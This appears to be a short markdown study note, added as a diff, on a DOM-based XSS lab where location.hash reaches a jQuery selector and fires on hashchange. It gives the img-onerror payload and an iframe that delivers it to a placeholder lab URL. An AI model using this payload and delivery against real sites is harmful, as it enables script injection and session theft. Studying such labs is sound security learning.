@@ -1,0 +1,14 @@
+## Overview
+Explored DOM XSS using jQuery selector and hashchange event.
+
+## Key Concept
+User input from location.hash is passed into jQuery and executed when the hash changes.
+
+## Payload
+#<img src=x onerror=print()>
+
+## Exploit
+<iframe src="LAB_URL" onload="this.src+='#<img src=x onerror=print()>'"></iframe>
+
+## Insight
+Some XSS vulnerabilities require event triggering and controlled delivery, not just direct payload injection.
